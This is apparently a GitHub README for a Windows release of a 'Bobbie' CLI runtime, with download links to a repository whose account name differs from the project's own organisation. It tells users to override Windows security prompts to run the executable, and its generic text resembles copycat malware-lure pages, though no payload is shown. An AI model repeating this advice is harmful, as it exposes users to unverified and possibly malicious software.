# 🧩 bobbie-releases - Download Bobbie for Windows

[![Download Bobbie Releases](https://img.shields.io/badge/Download%20Bobbie-Releases-blue?style=for-the-badge)](https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases)

## 🖥️ What this is

Bobbie Releases is the public download page for the Bobbie CLI runtime.  
Use it to get the release files you need on Windows.

This repository does not include the private Bobbie source code. It includes the built release files and runtime contract docs for people who use Bobbie.

## 📥 Download Bobbie on Windows

Visit this page to download:  
https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases

On that page, look for the latest release and download the Windows file. If there are more than one file, choose the one that matches your computer.

## 🚀 Getting Started

Follow these steps to download and run Bobbie on Windows.

1. Open the download page in your browser.
2. Find the latest release near the top of the page.
3. Open the release assets section.
4. Download the Windows file.
5. Save the file to your Downloads folder or Desktop.
6. If the file is a ZIP archive, right-click it and choose Extract All.
7. Open the extracted folder.
8. Run the Bobbie file.

If Windows shows a security prompt, choose the option that lets you run the file.

## 🪟 Windows Setup

Bobbie is meant to run on a Windows desktop or laptop.

A typical Windows setup includes:

- Windows 10 or Windows 11
- Internet access for the first download
- Enough free disk space for the release file
- Permission to run downloaded files

If your device is managed by a work or school account, you may need approval before you can run the app.

## 📦 What You Download

The release page may include files such as:

- a Windows executable
- a ZIP file with the app inside
- release notes
- runtime docs

If you download a ZIP file, extract it before you try to run Bobbie.

## 🏃 Run Bobbie

After you download the file:

- If you got an `.exe` file, double-click it to start Bobbie.
- If you got a `.zip` file, extract it first, then open the app file inside.
- If Windows asks whether you want to allow the app to make changes, review the prompt and continue if you trust the file source.

Bobbie is a CLI runtime, so some releases may open a command window. That is normal.

## 📚 Release Docs

This repository includes local copies of the current runtime contract docs for release users.

Use these files if you want to check how Bobbie expects data and command input to work:

- [docs/README.md](docs/README.md)
- [docs/shader_contract.md](docs/shader_contract.md)
- [docs/uniforms.md](docs/uniforms.md)
- [docs/cli_arguments.md](docs/cli_arguments.md)

The shader contract docs include the current UV rules. Bobbie provides a runtime fragment input varying at `location = 0`, and fragment shaders may use one of these names for that input:

- `u_uv`
- `uv`
- `v_uv`
- `v_tex_coord`
- `tex_coord`

## 🛠️ What Bobbie Does

Bobbie is a runtime for the Bobbie CLI. It is used to run release builds that work with the separate harness project.

Common use cases include:

- running Bobbie runtime builds on Windows
- testing release artifacts
- using the CLI runtime with a harness setup
- working with shader-based input and output flows
- checking how the runtime handles command arguments

## 🧭 Where the Main Docs Live

The main public documentation lives in the separate harness repository:

- https://github.com/4014-Labs/bobbie-harness

Use that repo for:

- install and usage guidance
- harness setup
- sandbox workflows
- provider and model integration

## ✅ Before You Run

Check these points before you start:

- You downloaded the file from the release page
- You picked the Windows version
- You extracted the file if it came as a ZIP
- You run the app from a folder you can access
- Your system can open downloaded apps

## 🧩 Common File Types

You may see one of these file types in a release:

- `.exe` for a Windows app
- `.zip` for a packaged release
- `.txt` or `.md` for notes and docs

Use the file that matches the release notes on the download page.

## 🔍 If the App Does Not Start

If Bobbie does not start:

- Check that the download finished
- Make sure the file is not still in a ZIP archive
- Try opening the file from a local folder like Downloads
- Check whether Windows blocked the file
- Confirm that you chose the Windows release asset

## 🗂️ Folder Layout

A release may include files like these:

- `bobbie.exe`
- `README.md`
- `docs/`
- `release-notes.txt`

If you see a `docs` folder, open it for the runtime contract files.

## 🧠 Notes for Release Users

Bobbie Releases is for end users who need the runtime files.  
It is not the source code repo.  
It is the place to get the public build files and the current runtime docs.

## 📎 Download Link

https://github.com/confirmed-asiancoralsnake620/bobbie-releases/releases